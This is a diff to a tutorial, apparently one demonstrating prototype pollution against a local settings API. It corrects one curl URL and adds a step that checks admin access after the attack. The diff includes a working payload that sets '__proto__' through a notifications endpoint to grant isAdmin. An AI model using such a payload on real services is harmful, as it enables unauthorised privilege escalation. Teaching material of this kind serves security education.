@@ -159,7 +159,7 @@ curl http://localhost:8080/users/1/settings | jq
 Let's set a setting to enabled:
 
 ```bash
-curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/settings -d '{"darkmode": true}' 
+curl -X POST -H 'Content-Type: application/json' http://localhost:8080/users/1/settings -d '{"darkmode": true}' 
 ```
 
 Now let's specifically set the notifications settings
@@ -172,4 +172,10 @@ Now let's abuse this with a prototype pollution payload:
 
 ```bash
 curl -X PUT -H 'Content-Type: application/json' http://localhost:8080/users/1/settings/notifications -d '{"notificationType": "__proto__", "notificationMode": "isAdmin", "notificationModeValue": true}'
+```
+
+Let's try to access the admin route now:
+
+```bash
+curl http://localhost:8080/admin
 ```
